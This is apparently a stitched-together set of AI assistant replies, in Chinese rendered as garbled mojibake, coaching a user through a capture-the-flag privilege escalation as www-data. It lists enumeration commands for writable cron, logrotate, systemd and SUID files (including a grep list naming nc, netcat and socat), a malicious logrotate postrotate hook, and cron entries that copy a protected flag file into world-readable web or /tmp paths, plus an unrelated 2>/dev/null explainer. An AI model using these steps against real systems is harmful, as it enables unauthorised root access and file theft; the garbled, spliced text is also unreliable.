  è¿™è¡¨æ˜8888ç«¯å£ç°åœ¨æ˜¯å¼€æ”¾çš„ï¼Œå¹¶ä¸”å¯ä»¥å»ºç«‹TCPè¿æ¥ã€‚å¦‚æœæ‚¨éœ€è¦å»ºç«‹åå‘shellè¿æ¥ï¼Œ
  éœ€è¦åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè®¾ç½®ç›‘å¬å™¨ï¼Œç„¶åä»æ‚¨çš„è®¾å¤‡è¿æ¥è¿‡å»ã€‚

----


  æ£€æŸ¥å¯åˆ©ç”¨ç‚¹çš„å‘½ä»¤ï¼š

    1 # æ£€æŸ¥logrotateé…ç½®æ–‡ä»¶æƒé™
    2 ls -la /etc/logrotate.d/nginx
    3 
    4 # æ£€æŸ¥cronç›®å½•æƒé™
    5 ls -la /etc/cron.hourly/
    6 ls -la /etc/cron.daily/
    7 ls -la /etc/cron.weekly/
    8 ls -la /etc/cron.monthly/
    9 
   10 # æ£€æŸ¥æ˜¯å¦å­˜åœ¨å¯å†™å…¥çš„é…ç½®æ–‡ä»¶
   11 find /etc/cron* -type f -perm -o+w 2>/dev/null
   12 find /etc -name "*.d" -type d -perm -o+w 2>/dev/null

  åˆ©ç”¨æ–¹æ³•ï¼š

  å¦‚æœå‘ç°/etc/logrotate.d/nginxå¯å†™å…¥ï¼š
    1 # ç¼–è¾‘è¯¥æ–‡ä»¶æ·»åŠ æ¶æ„é…ç½®
    2 echo "/var/log/nginx/*.log {
    3     daily
    4     missingok
    5     rotate 52
    6     compress
    7     delaycompress
    8     notifempty
    9     create 644 root root
   10     sharedscripts
   11     postrotate
   12         # åœ¨è¿™é‡Œæ·»åŠ æ¶æ„å‘½ä»¤
   13         /bin/cat /flag > /var/www/html/flag.txt
   14     endscript
   15 }" > /etc/logrotate.d/nginx

âœ¦ æˆ–è€…æ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–å¯å†™å…¥çš„cronç›¸å…³ç›®å½•æˆ–æ–‡ä»¶ã€‚

âœ¦ ä½œä¸ºwww-dataç”¨æˆ·ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥æ‰¾æƒé™å’Œå¯åˆ©ç”¨ç‚¹ï¼š

  1. æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™å’Œä¿¡æ¯

    1 # æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¿¡æ¯
    2 id
    3 whoami
    4 groups
    5 
    6 # æŸ¥çœ‹sudoæƒé™
    7 sudo -l
    8 
    9 # æŸ¥çœ‹å½“å‰ç›®å½•
   10 pwd
   11 ls -la

  2. æŸ¥æ‰¾å¯å†™çš„é…ç½®æ–‡ä»¶å’Œç›®å½•

   1 # æŸ¥æ‰¾å¯å†™çš„é…ç½®æ–‡ä»¶
   2 find /etc -writable -type f 2>/dev/null
   3 
   4 # æŸ¥æ‰¾å¯å†™çš„ç›®å½•
   5 find /etc -writable -type d 2>/dev/null
   6 
   7 # æŸ¥æ‰¾æ‰€æœ‰å¯å†™çš„æ–‡ä»¶ï¼ˆé™åˆ¶èŒƒå›´é¿å…è¾“å‡ºè¿‡å¤šï¼‰
   8 find /etc/cron* -writable -type f 2>/dev/null
   9 find /etc/logrotate.d/ -writable -type f 2>/dev/null

  3. æŸ¥æ‰¾SUIDäºŒè¿›åˆ¶æ–‡ä»¶

   1 # æŸ¥æ‰¾æ‰€æœ‰SUIDæ–‡ä»¶
   2 find / -perm -4000 2>/dev/null
   3 
   4 # æŸ¥æ‰¾å¸¸è§çš„å¯åˆ©ç”¨SUIDæ–‡ä»¶
   5 find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -E
     "(nmap|vim|less|more|nano|cp|mv|cat|touch|find|awk|perl|python|bash|
     sh|zsh|csh|ksh|tcsh|env|expect|ftp|gdb|gimp|gpasswd|grep|ip|less|mor
     e|mount|nmap|passwd|perl|php|python|ruby|scp|sh|ssh|su|sudo|tar|top|
     traceroute|vi|vim|wget|curl|gcc|cc|make|gcc|g++|ld|ldd|strace|gdb|tc
     pdump|nc|netcat|socat|nmap|gimp|gpasswd|chfn|chsh|mount|umount|passw
     d|su|sudo|traceroute|crontab|at|atd|crond|cron|logrotate|logrotate.d
     )"

  4. æŸ¥æ‰¾å¯å†™å…¥çš„è®¡åˆ’ä»»åŠ¡ç›¸å…³æ–‡ä»¶

   1 # æŸ¥æ‰¾cronç›¸å…³çš„å¯å†™æ–‡ä»¶
   2 find /etc/cron* -type f -writable 2>/dev/null
   3 find /etc -name "*cron*" -type f -writable 2>/dev/null
   4 find /etc -name "*crontab*" -type f -writable 2>/dev/null
   5 
   6 # æ£€æŸ¥/etc/cron.d/ç›®å½•
   7 ls -la /etc/cron.d/
   8 find /etc/cron.d/ -type f -writable 2>/dev/null

  5. æ£€æŸ¥logrotateé…ç½®æ–‡ä»¶

   1 # æ£€æŸ¥logrotateç›®å½•
   2 ls -la /etc/logrotate.d/
   3 find /etc/logrotate.d/ -type f -writable 2>/dev/null
   4 
   5 # æ£€æŸ¥logrotateä¸»é…ç½®
   6 ls -la /etc/logrotate.conf

  6. æŸ¥æ‰¾å¯ä¿®æ”¹çš„systemdæœåŠ¡

   1 find /etc/systemd/ -writable -type f 2>/dev/null
   2 find /lib/systemd/ -writable -type f 2>/dev/null
   3 find /usr/lib/systemd/ -writable -type f 2>/dev/null

  7. æ£€æŸ¥PATHç¯å¢ƒå˜é‡ä¸­çš„å¯å†™ç›®å½•

   1 echo $PATH
   2 # æ£€æŸ¥PATHä¸­çš„æ¯ä¸ªç›®å½•æ˜¯å¦æœ‰å¯å†™æƒé™
   3 ls -la /usr/local/bin/
   4 ls -la /usr/bin/
   5 ls -la /bin/
   6 # å¯¹PATHä¸­çš„æ¯ä¸ªç›®å½•éƒ½æ£€æŸ¥

  8. æ£€æŸ¥å¯å†™å…¥çš„å¯åŠ¨è„šæœ¬

   1 find /etc/init.d/ -type f -writable 2>/dev/null
   2 find /etc/rc.d/ -type f -writable 2>/dev/null
   3 find /etc/rc.local -writable 2>/dev/null

  9. ä½¿ç”¨é€šé…ç¬¦æŸ¥æ‰¾æƒé™ç›¸å…³æ–‡ä»¶

   1 # æŸ¥æ‰¾æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶
   2 find /usr/bin -type f -executable 2>/dev/null | head -20
   3 
   4 # æŸ¥æ‰¾å¯èƒ½çš„é…ç½®æ–‡ä»¶
   5 find /etc -name "*.conf" -o -name "*.cfg" -o -name "*.config"
     2>/dev/null | head -20

  10. æ£€æŸ¥è¿›ç¨‹å’Œæ­£åœ¨è¿è¡Œçš„æœåŠ¡

   1 ps aux | grep root
   2 # æŸ¥çœ‹å“ªäº›ä»¥rootæƒé™è¿è¡Œçš„è¿›ç¨‹å¯èƒ½æœ‰é…ç½®æ–‡ä»¶å¯è¢«ä¿®æ”¹

âœ¦ è¿™äº›å‘½ä»¤ä¼šå¸®åŠ©æ‚¨æ‰¾åˆ°å¯èƒ½çš„æƒé™æå‡è·¯å¾„ã€‚é‡ç‚¹å…³æ³¨é‚£äº›æ‚¨ä½œä¸ºwww-dataç”¨æˆ·å¯ä»¥å†™å…¥
  çš„é…ç½®æ–‡ä»¶ï¼Œç‰¹åˆ«æ˜¯ä¸cronã€logrotateã€systemdæœåŠ¡ç›¸å…³çš„æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸ä¼šä»¥rootæƒé™æ‰§è¡Œã€‚


`2>/dev/null` æ˜¯Shellè„šæœ¬ä¸­çš„é‡å®šå‘è¯­æ³•ï¼Œç”¨äºå¤„ç†å‘½ä»¤çš„é”™è¯¯è¾“å‡ºã€‚ä¸‹é¢æˆ‘æ¥è¯¦ç»†è§£é‡Šå®ƒçš„å«ä¹‰å’Œç”¨é€”ï¼š

### åŸºæœ¬å«ä¹‰

- `2`ï¼šä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆstderrï¼‰çš„æ–‡ä»¶æè¿°ç¬¦
- `>`ï¼šé‡å®šå‘æ“ä½œç¬¦
- `/dev/null`ï¼šLinux/Unixç³»ç»Ÿä¸­çš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œç›¸å½“äºä¸€ä¸ª"é»‘æ´"ï¼Œä»»ä½•å†™å…¥å®ƒçš„æ•°æ®éƒ½ä¼šè¢«ä¸¢å¼ƒ

æ‰€ä»¥ï¼Œ`2>/dev/null`çš„æ•´ä½“æ„æ€æ˜¯ï¼š**å°†å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„é”™è¯¯ä¿¡æ¯ä¸¢å¼ƒï¼Œä¸æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Š**ã€‚

### ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒï¼Ÿ

1. **æ¸…ç†è¾“å‡ºç•Œé¢**ï¼š
   - æœ‰äº›å‘½ä»¤å³ä½¿æˆåŠŸæ‰§è¡Œä¹Ÿä¼šäº§ç”Ÿå¤§é‡è­¦å‘Šæˆ–é”™è¯¯ä¿¡æ¯
   - ä½¿ç”¨`2>/dev/null`å¯ä»¥è®©è¾“å‡ºæ›´åŠ å¹²å‡€ï¼Œåªæ˜¾ç¤ºæˆ‘ä»¬å…³å¿ƒçš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰

2. **é¿å…å¹²æ‰°è‡ªåŠ¨åŒ–è„šæœ¬**ï¼š
   - åœ¨è‡ªåŠ¨åŒ–è„šæœ¬ä¸­ï¼Œé”™è¯¯ä¿¡æ¯å¯èƒ½ä¼šå¹²æ‰°åç»­å¤„ç†
   - ç‰¹åˆ«æ˜¯åœ¨æ£€æŸ¥å‘½ä»¤æ‰§è¡ŒçŠ¶æ€æ—¶ï¼Œå¯ä»¥é¿å…é”™è¯¯ä¿¡æ¯å¯¼è‡´çš„åˆ¤æ–­å¤±è¯¯

3. **æé«˜ç”¨æˆ·ä½“éªŒ**ï¼š
   - åœ¨äº¤äº’å¼ç¯å¢ƒä¸­ï¼Œåªæ˜¾ç¤ºæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸ä¼šè®©ç”¨æˆ·çœ‹åˆ°æ— å…³çš„é”™è¯¯æç¤º

4. **å¤„ç†é¢„æœŸçš„é”™è¯¯**ï¼š
   - æœ‰äº›å‘½ä»¤æ‰§è¡Œæ—¶ä¼šäº§ç”Ÿé”™è¯¯ï¼Œä½†è¿™æ˜¯é¢„æœŸå†…çš„ï¼ˆå¦‚`grep`æœªæ‰¾åˆ°åŒ¹é…é¡¹æ—¶ï¼‰
   - ä½¿ç”¨`2>/dev/null`å¯ä»¥é™é»˜è¿™äº›é¢„æœŸå†…çš„é”™è¯¯

### ä½¿ç”¨åœºæ™¯ç¤ºä¾‹

#### 1. æŸ¥æ‰¾æ–‡ä»¶æ—¶å¿½ç•¥æƒé™é”™è¯¯

```bash
find / -name "*.py" 2>/dev/null
```
å½“åœ¨ç³»ç»Ÿç›®å½•ä¸­æœç´¢æ–‡ä»¶æ—¶ï¼Œä¼šé‡åˆ°å¾ˆå¤šæƒé™ä¸è¶³çš„é”™è¯¯ï¼Œä½¿ç”¨`2>/dev/null`å¯ä»¥åªæ˜¾ç¤ºæ‰¾åˆ°çš„æ–‡ä»¶ã€‚

#### 2. æµ‹è¯•å‘½ä»¤æ˜¯å¦å­˜åœ¨

```bash
command -v some_command >/dev/null 2>&1
```
è¿™é‡ŒåŒæ—¶é‡å®šå‘äº†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ï¼Œåªå…³å¿ƒå‘½ä»¤çš„è¿”å›çŠ¶æ€ã€‚

#### 3. è¿‡æ»¤è¾“å‡º

```bash
ls -la /nonexistent 2>/dev/null || echo "ç›®å½•ä¸å­˜åœ¨"
```
å½“ç›®å½•ä¸å­˜åœ¨æ—¶ï¼Œé”™è¯¯ä¿¡æ¯ä¼šè¢«ä¸¢å¼ƒï¼Œåªæ˜¾ç¤ºæˆ‘ä»¬è‡ªå®šä¹‰çš„æç¤ºã€‚

### ç›¸å…³çŸ¥è¯†æ‰©å±•

- `1>` æˆ– `>`ï¼šé‡å®šå‘æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰
- `2>`ï¼šé‡å®šå‘æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰
- `&>`ï¼šåŒæ—¶é‡å®šå‘æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯
- `>/dev/null 2>&1`ï¼šå…ˆå°†stdouté‡å®šå‘åˆ°é»‘æ´ï¼Œå†å°†stderré‡å®šå‘åˆ°ä¸stdoutç›¸åŒçš„ä½ç½®

### åœ¨CTFä¸­çš„åº”ç”¨

åœ¨æ‚¨çš„å·¥ä½œç›®å½•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šè„šæœ¬å¯èƒ½ä¼šç”¨åˆ°è¿™ç§é‡å®šå‘æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿›è¡Œæ¼æ´æµ‹è¯•æˆ–ç½‘ç»œæ‰«ææ—¶ï¼š

1. é¿å…æ‰«æè¿‡ç¨‹ä¸­çš„é”™è¯¯ä¿¡æ¯å¹²æ‰°ç»“æœåˆ†æ
2. åœ¨SQLæ³¨å…¥ç­‰æµ‹è¯•ä¸­ï¼Œåªå…³æ³¨æˆåŠŸçš„ç»“æœ
3. ä¿æŒè¾“å‡ºçš„æ•´æ´ï¼Œä¾¿äºåç»­å¤„ç†

### æ³¨æ„äº‹é¡¹

1. è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šéšè—çœŸæ­£éœ€è¦å…³æ³¨çš„é”™è¯¯
2. åœ¨è°ƒè¯•è„šæœ¬æ—¶ï¼Œå»ºè®®æš‚æ—¶ç§»é™¤é‡å®šå‘ä»¥ä¾¿æŸ¥çœ‹æ‰€æœ‰è¾“å‡º
3. è€ƒè™‘å°†é”™è¯¯è¾“å‡ºä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œè€Œä¸æ˜¯å®Œå…¨ä¸¢å¼ƒï¼š`2>>error.log`

æ€»ç»“æ¥è¯´ï¼Œ`2>/dev/null`æ˜¯ä¸€ç§å¸¸ç”¨çš„ShellæŠ€å·§ï¼Œç”¨äºæ§åˆ¶å‘½ä»¤çš„é”™è¯¯è¾“å‡ºï¼Œä½¿è„šæœ¬æ›´åŠ å¥å£®ï¼Œè¾“å‡ºæ›´åŠ æ¸…æ™°ã€‚


----

âœ¦ è¦è®©ä»»ä½•äººéƒ½èƒ½æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œæ‚¨éœ€è¦è®¾ç½®é€‚å½“çš„æ–‡ä»¶æƒé™ã€‚ä»¥ä¸‹æ˜¯å‡ ç§æ–¹æ³•ï¼š

  æ–¹æ³•1ï¼šåœ¨crontabä¸­åŒæ—¶åˆ›å»ºæ–‡ä»¶å¹¶è®¾ç½®æƒé™

   1 * * * * * /bin/cat flag >> /tmp/flag_output 2>&1 && chmod 644
     /tmp/flag_output

  æ–¹æ³•2ï¼šä½¿ç”¨æ›´å®½æ¾çš„æƒé™

   1 * * * * * /bin/cat flag >> /tmp/flag_output 2>&1 && chmod 666
     /tmp/flag_output

  æ–¹æ³•3ï¼šåˆ›å»ºä¸€ä¸ªæ‰€æœ‰äººéƒ½å¯è¯»çš„ç›®å½•

   1 * * * * * mkdir -p /var/www/html/outputs && /bin/cat flag >>
     /var/www/html/outputs/flag_output 2>&1 && chmod 644
     /var/www/html/outputs/flag_output

  æ–¹æ³•4ï¼šå¦‚æœç³»ç»Ÿæœ‰webæœåŠ¡å™¨ï¼Œè¾“å‡ºåˆ°webç›®å½•

   1 * * * * * /bin/cat flag > /var/www/html/flag.txt 2>&1 && chmod 644
     /var/www/html/flag.txt

  ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®ï¼šhttp://[æœåŠ¡å™¨IP]/flag.txt

  æƒé™è¯´æ˜ï¼š
   - 644ï¼šæ‰€æœ‰è€…å¯è¯»å†™ï¼Œç»„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·åªè¯»
   - 666ï¼šæ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»å†™
   - 755ï¼šæ‰€æœ‰è€…å¯è¯»å†™æ‰§è¡Œï¼Œå…¶ä»–ç”¨æˆ·å¯è¯»æ‰§è¡Œ

  å®Œæ•´çš„crontabæ¡ç›®ç¤ºä¾‹ï¼š

   1 # æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œç¡®ä¿æ–‡ä»¶æƒé™ä¸ºæ‰€æœ‰äººå¯è¯»
   2 * * * * * /bin/cat flag >> /tmp/flag_output 2>&1 && chmod 644
     /tmp/flag_output
   3 
   4 # æˆ–è€…æ›´å®½æ¾çš„æƒé™
   5 * * * * * /bin/cat flag >> /tmp/flag_output 2>&1 && chmod 666
     /tmp/flag_output

âœ¦ è¿™æ ·ä»»ä½•äººéƒ½å¯ä»¥è¯»å–/tmp/flag_outputæ–‡ä»¶çš„å†…å®¹äº†ã€‚